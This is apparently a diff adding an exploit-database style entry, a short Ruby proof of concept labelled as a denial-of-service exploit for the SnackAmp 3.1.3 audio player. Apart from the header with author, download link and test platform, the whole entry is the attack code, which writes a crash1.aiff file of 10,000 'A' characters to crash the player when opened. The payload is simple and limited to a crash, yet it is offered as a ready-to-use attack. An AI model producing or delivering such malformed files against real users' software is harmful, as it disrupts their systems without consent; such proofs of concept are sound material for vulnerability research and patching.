@@ -1,0 +1,17 @@
+SnackAmp 3.1.3 Malicious aiff File Denial of service
+===================================================================================
+# Exploit Title:SnackAmp 3.1.3 Malicious aiff File Denial of service
+# Download link :http://sourceforge.net/projects/snackamp/
+# Author: Ahmed Elhady Mohamed
+# Email : ahmed.elhady.mohamed@gmail.com
+# version: 3.1.3
+# Category: DOS
+# Tested on: ubuntu 11.4 
+===================================================================================
+
+File.open "crash1.aiff" , "w" do |file|
+
+buffer = "A" * 10000
+
+file.puts buffer
+end
